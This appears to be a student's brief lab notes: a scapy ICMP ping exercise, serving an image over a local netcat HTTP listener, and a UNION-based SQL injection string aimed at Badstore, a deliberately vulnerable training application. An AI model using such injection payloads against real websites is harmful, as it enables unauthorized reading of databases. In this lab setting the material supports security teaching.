7a
sudo python3

from scapy.all import *
packet = IP(dst="8.8.8.8")/ICMP()
send(packet)
open wwire shark and search for icmp then re run the below command 
send(IP(dst="8.8.8.8")/ICMP())


ans, unans = sr(packet, timeout=2)
ans[0]
ans[0][1].show()

7b
nc -l -p 8080 < image.jpg

or 

printf "HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\nConnection: close\r\n\r\n" | cat - lion.jpeg | nc -l -p 8080

http://localhost:8080

7c Badstore
x' union select count(itemnum),count(itemnum),count(itemnum),count(itemnum) from
itemdb -- 
